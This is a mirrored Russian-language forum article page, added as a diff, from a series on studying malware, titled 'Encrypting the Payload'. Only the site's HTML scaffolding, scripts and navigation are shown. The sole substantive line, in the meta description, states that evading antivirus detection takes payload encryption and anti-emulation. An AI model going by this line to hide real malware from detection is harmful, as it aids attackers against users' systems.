@@ -1,0 +1,4016 @@
+<!DOCTYPE html>
+<html id="XF" lang="ru-RU" dir="LTR"
+	data-xf="2.3"
+	data-app="public"
+	data-variation="alternate"
+	data-color-scheme="dark"
+	data-template="xa_ams_article_page_view"
+	data-container-key="amsCategory-2"
+	data-content-key=""
+	data-logged-in="false"
+	data-cookie-prefix="xf_"
+	data-csrf="1758965527,841cd65eb179abba5c913c9e5cd29e63"
+	class="has-no-js template-xa_ams_article_page_view"
+	>
+
+<!-- Mirrored from osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/shifruyem-payload.10/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 Sep 2025 09:42:03 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+	<link rel="icon" href="../../../../favicon.ico" type="image/x-icon">
+	
+	
+	
+
+	<meta charset="utf-8" />
+	<title>Цикл статей &quot;Изучение вредоносных программ&quot; | Шифруем Payload | Osint42.Org - Безопасность и код</title>
+	<link rel="manifest" crossorigin="use-credentials" href="../../../../webmanifest.php">
+
+	<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+
+	
+		
+			<meta name="theme-color" content="#0a1c29" />
+		
+	
+
+	<meta name="apple-mobile-web-app-title" content="Osint42.Org - Безопасность и код">
+	
+		<link rel="apple-touch-icon" href="../../../../data/assets/logo/192192.png">
+		
+
+	
+		
+		<meta property="og:title" content="Шифруем Payload | Цикл статей &quot;Изучение вредоносных программ&quot;" />
+		<meta property="twitter:title" content="Шифруем Payload | Цикл статей &quot;Изучение вредоносных программ&quot;" />
+	
+	
+		
+		<meta name="description" content="В предыдущей статье мы рассмотрели где хранить полезную нагрузку (Payload), но как было сказано в коментарии к статье, для обхода детекта нужно много чего..." />
+		<meta property="og:description" content="В предыдущей статье мы рассмотрели где хранить полезную нагрузку (Payload), но как было сказано в коментарии к статье, для обхода детекта нужно много чего сделать, в частности нужно зашифровать Payload и ещё позаботится об антиэмуляции и скрытия..." />
+		<meta property="twitter:description" content="В предыдущей статье мы рассмотрели где хранить полезную нагрузку (Payload), но как было сказано в коментарии к статье, для обхода детекта нужно много чего сделать, в частности нужно зашифровать..." />
+	
+	
+		<meta property="og:type" content="article" />
+	
+		<meta property="og:url" content="index.html" />
+	
+		<link rel="canonical" href="index.html" />
+	
+		
+		<meta property="og:image" content="1746773556787.png" />
+		<meta property="twitter:image" content="1746773556787.png" />
+		<meta property="twitter:card" content="summary_large_image" />
+	
+	
+
+	
+		
+	
+	
+	<meta property="og:site_name" content="Osint42.Org - Безопасность и код" />
+
+
+	
+	
+	
+	
+	
+	
+
+	
+	
+	
+		
+	
+	
+
+	<link rel="stylesheet" href="../../../../cssf1bd.css?css=public%3Anormalize.css%2Cpublic%3Afa.css%2Cpublic%3Avariations.less%2Cpublic%3Acore.less%2Cpublic%3Aapp.less&amp;s=1&amp;l=2&amp;d=1758392320&amp;k=650febe17d52673553ff8fcab924bc52ae7c26c5" />
+
+	<link rel="stylesheet" href="../../../../cssa4a6.css?css=public%3Aalnb_navigation.less%2Cpublic%3Abb_code.less%2Cpublic%3Alightbox.less%2Cpublic%3Anotices.less%2Cpublic%3Ashare_controls.less%2Cpublic%3Axa_ams.less%2Cpublic%3Axa_ams_comment.less%2Cpublic%3Aextra.less&amp;s=1&amp;l=2&amp;d=1758392320&amp;k=ecd081a308b705ae506a43d4915bd16740d009d9" />
+
+
+	
+		<script data-cfasync="false" src="../../../../js/xf/preamble.minf74f.js?_v=01eb82fa"></script>
+	
+
+	
+	<script data-cfasync="false" src="../../../../js/vendor/vendor-compiledf74f.js?_v=01eb82fa" defer></script>
+	<script data-cfasync="false" src="../../../../js/xf/core-compiledf74f.js?_v=01eb82fa" defer></script>
+
+	<script data-cfasync="false">
+		XF.ready(() =>
+		{
+			XF.extendObject(true, XF.config, {
+				// 
+				userId: 0,
+				enablePush: true,
+				pushAppServerKey: 'BA479YFsUh5Dh5bOkTEWM7LoORrEgUroE2adYpgA6_NLt6AmfJFBdCBxt_i9NhpAIXJviINVU4JDqWxez0NnB-w',
+				url: {
+					fullBase: 'https://osint42.org/',
+					basePath: '/',
+					css: '/css.php?css=__SENTINEL__&s=1&l=2&d=1758392320',
+					js: '/js/__SENTINEL__?_v=01eb82fa',
+					icon: '/data/local/icons/__VARIANT__.svg?v=1757401797#__NAME__',
+					iconInline: '/styles/fa/__VARIANT__/__NAME__.svg?v=5.15.3',
+					keepAlive: '/login/keep-alive'
+				},
+				cookie: {
+					path: '/',
+					domain: '',
+					prefix: 'xf_',
+					secure: true,
+					consentMode: 'disabled',
+					consented: ["optional","_third_party"]
+				},
+				cacheKey: '60356f7aa4f82ca98e605b4e87a0a057',
+				csrf: '1758965527,841cd65eb179abba5c913c9e5cd29e63',
+				js: {"\/js\/xf\/lightbox-compiled.js?_v=01eb82fa":true,"\/js\/xf\/code_block-compiled.js?_v=01eb82fa":true,"\/js\/copycode\/copycode.min.js?_v=01eb82fa":true,"\/js\/DCom\/LiveContent\/4.4.1\/socket.io.min.js?_v=01eb82fa":true,"\/js\/DCom\/LiveContent\/socket-conv.min.js?_v=01eb82fa":true},
+				fullJs: false,
+				css: {"public:alnb_navigation.less":true,"public:bb_code.less":true,"public:lightbox.less":true,"public:notices.less":true,"public:share_controls.less":true,"public:xa_ams.less":true,"public:xa_ams_comment.less":true,"public:extra.less":true},
+				time: {
+					now: 1758965527,
+					today: 1758920400,
+					todayDow: 6,
+					tomorrow: 1759006800,
+					yesterday: 1758834000,
+					week: 1758402000,
+					month: 1756674000,
+					year: 1735678800
+				},
+				style: {
+					light: 'default',
+					dark: 'alternate',
+					defaultColorScheme: 'light'
+				},
+				borderSizeFeature: '3px',
+				fontAwesomeWeight: 'r',
+				enableRtnProtect: true,
+				
+				enableFormSubmitSticky: true,
+				imageOptimization: '0',
+				imageOptimizationQuality: 0.85,
+				uploadMaxFilesize: 3145728,
+				uploadMaxWidth: 0,
+				uploadMaxHeight: 0,
+				allowedVideoExtensions: ["m4v","mov","mp4","mp4v","mpeg","mpg","ogv","webm"],
+				allowedAudioExtensions: ["mp3","opus","ogg","wav"],
+				shortcodeToEmoji: true,
+				visitorCounts: {
+					conversations_unread: '0',
+					alerts_unviewed: '0',
+					total_unread: '0',
+					title_count: true,
+					icon_indicator: true
+				},
+				jsMt: {"xf\/action.js":"dc2375bf","xf\/embed.js":"d3d00259","xf\/form.js":"d3d00259","xf\/structure.js":"dc2375bf","xf\/tooltip.js":"d3d00259"},
+				jsState: {},
+				publicMetadataLogoUrl: 'https://osint42.org/data/assets/logo/192192.png',
+				publicPushBadgeUrl: 'https://osint42.org/styles/default/xenforo/bell.png'
+			})
+
+			XF.extendObject(XF.phrases, {
+				// 
+"svStandardLib_time.day": "{count} day",
+"svStandardLib_time.days": "{count} дней",
+"svStandardLib_time.hour": "{count} hour",
+"svStandardLib_time.hours": "{count} часов",
+"svStandardLib_time.minute": "{count} минут",
+"svStandardLib_time.minutes": "{count} минут",
+"svStandardLib_time.month": "{count} month",
+"svStandardLib_time.months": "{count} месяцев",
+"svStandardLib_time.second": "{count} second",
+"svStandardLib_time.seconds": "{count} секунд",
+"svStandardLib_time.week": "time.week",
+"svStandardLib_time.weeks": "{count} недель",
+"svStandardLib_time.year": "{count} year",
+"svStandardLib_time.years": "{count} лет",
+copy_to_clipboard: "Скопировать в буфер обмена",
+text_copied_to_clipboard: "Текст скопирован в буфер обмена.",
+				date_x_at_time_y:     "{date} в {time}",
+				day_x_at_time_y:      "{day} в {time}",
+				yesterday_at_x:       "Вчера в {time}",
+				x_minutes_ago:        "{minutes} мин. назад",
+				one_minute_ago:       "Минуту назад",
+				a_moment_ago:         "Только что",
+				today_at_x:           "Сегодня в {time}",
+				in_a_moment:          "Через секунду",
+				in_a_minute:          "Через минуту",
+				in_x_minutes:         "Через {minutes} мин.",
+				later_today_at_x:     "Сегодня в {time}",
+				tomorrow_at_x:        "Завтра в {time}",
+				short_date_x_minutes: "{minutes} м.",
+				short_date_x_hours:   "{hours} ч.",
+				short_date_x_days:    "{days} д.",
+
+				day0: "Воскресенье",
+				day1: "Понедельник",
+				day2: "Вторник",
+				day3: "Среда",
+				day4: "Четверг",
+				day5: "Пятница",
+				day6: "Суббота",
+
+				dayShort0: "Вс",
+				dayShort1: "Пн",
+				dayShort2: "Вт",
+				dayShort3: "Ср",
+				dayShort4: "Чт",
+				dayShort5: "Пт",
+				dayShort6: "Сб",
+
+				month0: "Январь",
+				month1: "Февраль",
+				month2: "Март",
+				month3: "Апрель",
+				month4: "Май",
+				month5: "Июнь",
+				month6: "Июль",
+				month7: "Август",
+				month8: "Сентябрь",
+				month9: "Октябрь",
+				month10: "Ноябрь",
+				month11: "Декабрь",
+
+				active_user_changed_reload_page: "Ваша сессия истекла. Перезагрузите страницу.",
+				server_did_not_respond_in_time_try_again: "Сервер не ответил вовремя. Пожалуйста, попробуйте снова.",
+				oops_we_ran_into_some_problems: "Упс! Мы столкнулись с некоторыми проблемами.",
+				oops_we_ran_into_some_problems_more_details_console: "Упс! Мы столкнулись с некоторыми проблемами. Пожалуйста, попробуйте позже. Более детальную информацию об ошибке Вы можете посмотреть в консоли браузера",
+				file_too_large_to_upload: "Файл слишком большой для загрузки.",
+				uploaded_file_is_too_large_for_server_to_process: "Загружаемый файл слишком большой для обработки сервером.",
+				files_being_uploaded_are_you_sure: "Файлы ещё загружаются. Вы уверены, что хотите отправить эту форму?",
+				attach: "Прикрепить файлы",
+				rich_text_box: "Текстовое поле с поддержкой форматирования",
+				close: "Закрыть",
+				link_copied_to_clipboard: "Ссылка скопирована в буфер обмена.",
+				text_copied_to_clipboard: "Текст скопирован в буфер обмена.",
+				loading: "Загрузка...",
+				you_have_exceeded_maximum_number_of_selectable_items: "Вы превысили максимальное количество выбираемых элементов.",
+
+				processing: "Обработка",
+				'processing...': "Обработка...",
+
+				showing_x_of_y_items: "Показано {count} из {total} элементов",
+				showing_all_items: "Показаны все элементы",
+				no_items_to_display: "Нет элементов для отображения",
+
+				number_button_up: "Увеличить",
+				number_button_down: "Уменьшить",
+
+				push_enable_notification_title: "Push-уведомления для сайта Osint42.Org - Безопасность и код успешно включены",
+				push_enable_notification_body: "Спасибо за включение push-уведомлений!",
+
+				pull_down_to_refresh: "Потяните вниз для обновления",
+				release_to_refresh: "Отпустите для обновления",
+				refreshing: "Обновление..."
+			})
+		})
+	
+
+window.addEventListener('DOMContentLoaded',()=>{XF.Push.updateUserSubscriptionParent=XF.Push.updateUserSubscription;XF.Push.updateUserSubscription=function(b,a){"unsubscribe"===a&&XF.browser.safari&&XF.Push.setPushHistoryUserIds({});XF.Push.updateUserSubscriptionParent(b,a)}});
+</script>
+
+	<script data-cfasync="false" src="../../../../js/xf/lightbox-compiledf74f.js?_v=01eb82fa" defer></script>
+<script data-cfasync="false" src="../../../../js/xf/code_block-compiledf74f.js?_v=01eb82fa" defer></script>
+<script data-cfasync="false" src="../../../../js/copycode/copycode.minf74f.js?_v=01eb82fa" defer></script>
+<script data-cfasync="false" src="../../../../js/DCom/LiveContent/4.4.1/socket.io.minf74f.js?_v=01eb82fa" defer></script>
+<script data-cfasync="false" src="../../../../js/DCom/LiveContent/socket-conv.minf74f.js?_v=01eb82fa" defer></script>
+
+
+
+	
+		<link rel="icon" type="image/png" href="../../../../data/assets/logo/favicon.png" sizes="32x32" />
+	
+
+	
+	
+</head>
+<body data-template="xa_ams_article_page_view">
+
+<div class="p-pageWrapper" id="top">
+
+	
+
+	<header class="p-header" id="header">
+		<div class="p-header-inner">
+			<div class="p-header-content">
+				<div class="p-header-logo p-header-logo--image">
+					<a href="../../../../forums/index.html">
+						
+
+	
+
+	
+		
+		
+
+		
+	
+		
+		
+
+		
+	
+
+	
+
+	<picture data-variations="{&quot;default&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;,&quot;2&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;},&quot;alternate&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;,&quot;2&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;}}">
+		
+		
+		
+
+		
+
+		<img src="../../../../data/assets/logo_alternate/osint4242.png" srcset="/data/assets/logo_alternate/osint4242.png 2x" width="100" height="36" alt="Osint42.Org - Безопасность и код"  />
+	</picture>
+
+
+					</a>
+				</div>
+
+				
+			</div>
+		</div>
+	</header>
+
+	
+	
+
+	
+		<div class="p-navSticky p-navSticky--primary" data-xf-init="sticky-header">
+			
+		<nav class="p-nav">
+			<div class="p-nav-inner">
+				<button type="button" class="button button--plain p-nav-menuTrigger" data-xf-click="off-canvas" data-menu=".js-headerOffCanvasMenu" tabindex="0" aria-label="Меню"><span class="button-text">
+					<i aria-hidden="true"></i>
+				</span></button>
+
+				<div class="p-nav-smallLogo">
+					<a href="../../../../forums/index.html">
+						
+
+	
+
+	
+		
+		
+
+		
+	
+		
+		
+
+		
+	
+
+	
+
+	<picture data-variations="{&quot;default&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;,&quot;2&quot;:null},&quot;alternate&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;,&quot;2&quot;:null}}">
+		
+		
+		
+
+		
+
+		<img src="../../../../data/assets/logo_alternate/osint4242.png"  width="100" height="36" alt="Osint42.Org - Безопасность и код"  />
+	</picture>
+
+
+					</a>
+				</div>
+
+				<div class="p-nav-scroller hScroller" data-xf-init="h-scroller" data-auto-scroll=".p-navEl.is-selected">
+					<div class="hScroller-scroll">
+						<ul class="p-nav-list js-offCanvasNavSource">
+							
+								<li>
+									
+	<div class="p-navEl is-selected" data-has-children="true">
+	
+
+		
+	
+	<a href="../../../../index.html"
+	class="p-navEl-link p-navEl-link--splitMenu "
+	
+	
+	data-nav-id="xa_ams">Статьи</a>
+
+
+		<a data-xf-key="1"
+			data-xf-click="menu"
+			data-menu-pos-ref="< .p-navEl"
+			class="p-navEl-splitTrigger"
+			role="button"
+			tabindex="0"
+			aria-label="Переключатель раскрытия"
+			aria-expanded="false"
+			aria-haspopup="true"></a>
+
+		
+	
+		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
+			<div class="menu-content">
+				
+					
+	
+	
+	<a href="../../../../whats-new/ams-articles/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xa_amsNewArticles">Новые статьи</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../../../whats-new/ams-comments/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xa_amsNewComments">Новые комментарии</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../../authors/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	
+	
+	data-nav-id="xa_amsAuthorList">Список авторов</a>
+
+	
+
+				
+			</div>
+		</div>
+	
+	</div>
+
+								</li>
+							
+								<li>
+									
+	<div class="p-navEl " data-has-children="true">
+	
+
+		
+	
+	<a href="../../../../forums/index.html"
+	class="p-navEl-link p-navEl-link--splitMenu "
+	
+	
+	data-nav-id="forums">Форум</a>
+
+
+		<a data-xf-key="2"
+			data-xf-click="menu"
+			data-menu-pos-ref="< .p-navEl"
+			class="p-navEl-splitTrigger"
+			role="button"
+			tabindex="0"
+			aria-label="Переключатель раскрытия"
+			aria-expanded="false"
+			aria-haspopup="true"></a>
+
+		
+	
+		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
+			<div class="menu-content">
+				
+					
+	
+	
+	<a href="../../../../whats-new/posts/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	
+	
+	data-nav-id="newPosts">Новые сообщения</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../../../search/index4009.html?type=post"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	
+	
+	data-nav-id="searchForums">Поиск по форуму</a>
+
+	
+
+				
+			</div>
+		</div>
+	
+	</div>
+
+								</li>
+							
+								<li>
+									
+	<div class="p-navEl " data-has-children="true">
+	
+
+		
+	
+	<a href="../../../../whats-new/index.html"
+	class="p-navEl-link p-navEl-link--splitMenu "
+	
+	
+	data-nav-id="whatsNew">Что нового</a>
+
+
+		<a data-xf-key="3"
+			data-xf-click="menu"
+			data-menu-pos-ref="< .p-navEl"
+			class="p-navEl-splitTrigger"
+			role="button"
+			tabindex="0"
+			aria-label="Переключатель раскрытия"
+			aria-expanded="false"
+			aria-haspopup="true"></a>
+
+		
+	
+		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
+			<div class="menu-content">
+				
+					
+	
+	
+	<a href="../../../../whats-new/posts/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="whatsNewPosts">Новые сообщения</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../../../whats-new/ams-articles/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xaAmsWhatsNewNewArticles">Новые статьи</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../../../whats-new/media/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xfmgWhatsNewNewMedia">Новые медиа</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../../../whats-new/ams-comments/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xaAmsWhatsNewArticleComments">Новые комментарии к статье</a>
+
+	
+
+				
+			</div>
+		</div>
+	
+	</div>
+
+								</li>
+							
+								<li>
+									
+	<div class="p-navEl " data-has-children="true">
+	
+
+		
+	
+	<a href="../../../../media/index.html"
+	class="p-navEl-link p-navEl-link--splitMenu "
+	
+	
+	data-nav-id="xfmg">Медиа</a>
+
+
+		<a data-xf-key="4"
+			data-xf-click="menu"
+			data-menu-pos-ref="< .p-navEl"
+			class="p-navEl-splitTrigger"
+			role="button"
+			tabindex="0"
+			aria-label="Переключатель раскрытия"
+			aria-expanded="false"
+			aria-haspopup="true"></a>
+
+		
+	
+		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
+			<div class="menu-content">
+				
+					
+	
+	
+	<a href="../../../../whats-new/media/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xfmgNewMedia">Новые медиа</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../../../whats-new/media-comments/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xfmgNewComments">Новые комментарии</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../../../search/index4784.html?type=xfmg_media"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	
+	
+	data-nav-id="xfmgSearchMedia">Поиск медиа</a>
+
+	
+
+				
+			</div>
+		</div>
+	
+	</div>
+
+								</li>
+							
+								<li>
+									
+	<div class="p-navEl " data-has-children="true">
+	
+
+		
+	
+	<a href="https://osint42.org/members/"
+	class="p-navEl-link p-navEl-link--splitMenu "
+	
+	
+	data-nav-id="members">Пользователи</a>
+
+
+		<a data-xf-key="5"
+			data-xf-click="menu"
+			data-menu-pos-ref="< .p-navEl"
+			class="p-navEl-splitTrigger"
+			role="button"
+			tabindex="0"
+			aria-label="Переключатель раскрытия"
+			aria-expanded="false"
+			aria-haspopup="true"></a>
+
+		
+	
+		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
+			<div class="menu-content">
+				
+					
+	
+	
+	<a href="https://osint42.org/online/"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	
+	
+	data-nav-id="currentVisitors">Сейчас на форуме</a>
+
+	
+
+				
+			</div>
+		</div>
+	
+	</div>
+
+								</li>
+							
+						</ul>
+					</div>
+				</div>
+
+				<div class="p-nav-opposite">
+					<div class="p-navgroup p-account p-navgroup--guest">
+						
+							<a href="../../../../login/index.html" class="p-navgroup-link p-navgroup-link--textual p-navgroup-link--logIn"
+								data-xf-click="overlay" data-follow-redirects="on">
+								<span class="p-navgroup-linkText">Вход</span>
+							</a>
+							
+								<a href="../../../../register/index.html" class="p-navgroup-link p-navgroup-link--textual p-navgroup-link--register"
+									data-xf-click="overlay" data-follow-redirects="on">
+									<span class="p-navgroup-linkText">Регистрация</span>
+								</a>
+							
+						
+					</div>
+					
+					
+    <a href="https://osint42.org/misc/style-variation"
+       class="p-navgroup-link p-navgroup-link--iconic js-styleVariationsLink"
+       data-xf-click="menu"
+       data-menu-pos-ref="< .p-navgroup"
+       aria-label=" Выбор стиля"
+       aria-expanded="false"
+       aria-haspopup="true"
+       title=" Выбор стиля">
+        <i aria-hidden="true">
+            <i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
+        </i>
+        <span class="p-navgroup-linkText"> Выбор стиля</span>
+    </a>
+
+    <div class="menu menu--structural" data-menu="menu" aria-hidden="true">
+        <div class="menu-content js-styleVariationsMenu">
+            
+
+	
+		
+
+	<a href="https://osint42.org/misc/style-variation?reset=1&amp;t=1758965527%2C841cd65eb179abba5c913c9e5cd29e63"
+		class="menu-linkRow "
+		rel="nofollow"
+		data-xf-click="style-variation" data-variation="">
+
+		<i class="fa--xf far fa-adjust "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#adjust"></use></svg></i>
+
+		
+			Системный
+		
+	</a>
+
+
+		
+
+	<a href="https://osint42.org/misc/style-variation?variation=default&amp;t=1758965527%2C841cd65eb179abba5c913c9e5cd29e63"
+		class="menu-linkRow "
+		rel="nofollow"
+		data-xf-click="style-variation" data-variation="default">
+
+		<i class="fa--xf far fa-sun "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#sun"></use></svg></i>
+
+		
+			Светлый
+		
+	</a>
+
+
+		
+
+	<a href="https://osint42.org/misc/style-variation?variation=alternate&amp;t=1758965527%2C841cd65eb179abba5c913c9e5cd29e63"
+		class="menu-linkRow is-selected"
+		rel="nofollow"
+		data-xf-click="style-variation" data-variation="alternate">
+
+		<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
+
+		
+			Тёмный
+		
+	</a>
+
+	
+
+	
+		
+	
+
+        </div>
+    </div>
+
+
+
+					<div class="p-navgroup p-discovery">
+						<a href="../../../../whats-new/index.html"
+							
+
+	class="p-navgroup-link p-navgroup-link--iconic p-navgroup-link--whatsnew"
+
+							aria-label="Что нового"
+							title="Что нового">
+							<i aria-hidden="true"></i>
+							<span class="p-navgroup-linkText">Что нового</span>
+						</a>
+
+						
+							<a href="../../../../search/index.html"
+								class="p-navgroup-link p-navgroup-link--iconic p-navgroup-link--search"
+								data-xf-click="menu"
+								data-xf-key="/"
+								aria-label="Поиск"
+								aria-expanded="false"
+								aria-haspopup="true"
+								title="Поиск">
+								<i aria-hidden="true"></i>
+								<span class="p-navgroup-linkText">Поиск</span>
+							</a>
+							<div class="menu menu--structural menu--wide" data-menu="menu" aria-hidden="true">
+								<form action="https://osint42.org/search/search" method="post"
+									class="menu-content"
+									data-xf-init="quick-search">
+
+									<h3 class="menu-header">Поиск</h3>
+									
+									<div class="menu-row">
+										
+											<div class="inputGroup inputGroup--joined">
+												<input type="text" class="input" name="keywords" data-acurl="/search/auto-complete" placeholder="Поиск..." aria-label="Поиск" data-menu-autofocus="true" />
+												
+			<select name="constraints" class="js-quickSearch-constraint input" aria-label="Поиск в">
+				<option value="">Везде</option>
+<option value="{&quot;search_type&quot;:&quot;ams_article&quot;}">Статьи</option>
+<option value="{&quot;search_type&quot;:&quot;ams_article&quot;,&quot;c&quot;:{&quot;categories&quot;:[2],&quot;child_categories&quot;:1}}">Эта категория</option>
+
+			</select>
+		
+											</div>
+										
+									</div>
+
+									
+									<div class="menu-row">
+										<label class="iconic"><input type="checkbox"  name="c[title_only]" value="1" /><i aria-hidden="true"></i><span class="iconic-label">Искать только в заголовках
+
+													
+													<span tabindex="0" role="button"
+														data-xf-init="tooltip" data-trigger="hover focus click" title="Теги также будут учитываться">
+
+														<i class="fa--xf far fa-question-circle  u-muted u-smaller"><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Примечание</title><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#question-circle"></use></svg></i>
+													</span></span></label>
+
+									</div>
+									
+									<div class="menu-row">
+										<div class="inputGroup">
+											<span class="inputGroup-text" id="ctrl_search_menu_by_member">Автор:</span>
+											<input type="text" class="input" name="c[users]" data-xf-init="auto-complete" placeholder="Пользователь" aria-labelledby="ctrl_search_menu_by_member" />
+										</div>
+									</div>
+									<div class="menu-footer">
+									<span class="menu-footer-controls">
+										<button type="submit" class="button button--icon button--icon--search button--primary"><i class="fa--xf far fa-search "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#search"></use></svg></i><span class="button-text">Найти</span></button>
+										<button type="submit" class="button " name="from_search_menu"><span class="button-text">Расширенный поиск...</span></button>
+									</span>
+									</div>
+
+									<input type="hidden" name="_xfToken" value="1758965527,841cd65eb179abba5c913c9e5cd29e63" />
+								</form>
+							</div>
+						
+					</div>
+				</div>
+			</div>
+		</nav>
+	
+		</div>
+		
+		
+			<div class="p-sectionLinks">
+				<div class="p-sectionLinks-inner hScroller" data-xf-init="h-scroller">
+					<div class="hScroller-scroll">
+						<ul class="p-sectionLinks-list">
+							
+								<li>
+									
+	<div class="p-navEl " >
+	
+
+		
+	
+	<a href="../../../../whats-new/ams-articles/index.html"
+	class="p-navEl-link "
+	 rel="nofollow"
+	data-xf-key="alt+1"
+	data-nav-id="xa_amsNewArticles">Новые статьи</a>
+
+
+		
+
+		
+	
+	</div>
+
+								</li>
+							
+								<li>
+									
+	<div class="p-navEl " >
+	
+
+		
+	
+	<a href="../../../../whats-new/ams-comments/index.html"
+	class="p-navEl-link "
+	 rel="nofollow"
+	data-xf-key="alt+2"
+	data-nav-id="xa_amsNewComments">Новые комментарии</a>
+
+
+		
+
+		
+	
+	</div>
+
+								</li>
+							
+								<li>
+									
+	<div class="p-navEl " >
+	
+
+		
+	
+	<a href="../../../authors/index.html"
+	class="p-navEl-link "
+	
+	data-xf-key="alt+3"
+	data-nav-id="xa_amsAuthorList">Список авторов</a>
+
+
+		
+
+		
+	
+	</div>
+
+								</li>
+							
+						</ul>
+					</div>
+				</div>
+			</div>
+			
+	
+		
+
+	<div class="offCanvasMenu offCanvasMenu--nav js-headerOffCanvasMenu" data-menu="menu" aria-hidden="true" data-ocm-builder="navigation">
+		<div class="offCanvasMenu-backdrop" data-menu-close="true"></div>
+		<div class="offCanvasMenu-content">
+			<div class="offCanvasMenu-header">
+				Меню
+				<a class="offCanvasMenu-closer" data-menu-close="true" role="button" tabindex="0" aria-label="Закрыть"></a>
+			</div>
+			
+				<div class="p-offCanvasRegisterLink">
+					<div class="offCanvasMenu-linkHolder">
+						<a href="../../../../login/index.html" class="offCanvasMenu-link" data-xf-click="overlay" data-menu-close="true">
+							Вход
+						</a>
+					</div>
+					<hr class="offCanvasMenu-separator" />
+					
+						<div class="offCanvasMenu-linkHolder">
+							<a href="../../../../register/index.html" class="offCanvasMenu-link" data-xf-click="overlay" data-menu-close="true">
+								Регистрация
+							</a>
+						</div>
+						<hr class="offCanvasMenu-separator" />
+					
+				</div>
+			
+			<div class="js-offCanvasNavTarget"></div>
+			<div class="offCanvasMenu-installBanner js-installPromptContainer" style="display: none;" data-xf-init="install-prompt">
+				<div class="offCanvasMenu-installBanner-header">Установить приложение</div>
+				<button type="button" class="button js-installPromptButton"><span class="button-text">Установить</span></button>
+				<template class="js-installTemplateIOS">
+					<div class="js-installTemplateContent">
+						<div class="overlay-title">Как установить приложение на iOS</div>
+						<div class="block-body">
+							<div class="block-row">
+								<p>
+									Следуйте инструкциям в видео ниже, чтобы узнать, как установить наш сайт как веб-приложение на главный экран вашего устройства.
+								</p>
+								<p style="text-align: center">
+									<video src="../../../../styles/default/xenforo/add_to_home_new.mp4"
+										width="280" height="480" autoplay loop muted playsinline></video>
+								</p>
+								<p>
+									<small><strong>Примечание:</strong> Эта функция может быть недоступна в некоторых браузерах.</small>
+								</p>
+							</div>
+						</div>
+					</div>
+				</template>
+			</div>
+		</div>
+	</div>
+
+	<div class="p-body">
+		<div class="p-body-inner">
+			<!--XF:EXTRA_OUTPUT-->
+
+
+			
+				
+	
+		
+		
+
+		<ul class="notices notices--block  js-notices"
+			data-xf-init="notices"
+			data-type="block"
+			data-scroll-interval="6">
+
+			
+				
+	<li class="notice js-notice notice--primary notice--hasImage"
+		data-notice-id="1"
+		data-delay-duration="0"
+		data-display-duration="0"
+		data-auto-dismiss=""
+		data-visibility="">
+
+		
+			<div class="notice-image"><img src="../../../../data/assets/notice_images/c7eb1746-6291-4d37-b72b-8e3b5cfd1303.png" alt="" /></div>
+		
+		<div class="notice-content">
+			
+			<div class="block"
+     style="border:1px solid #ccc;
+            border-radius:8px;
+            padding:min(4vw,15px);
+            background:var(--xf-contentBg);
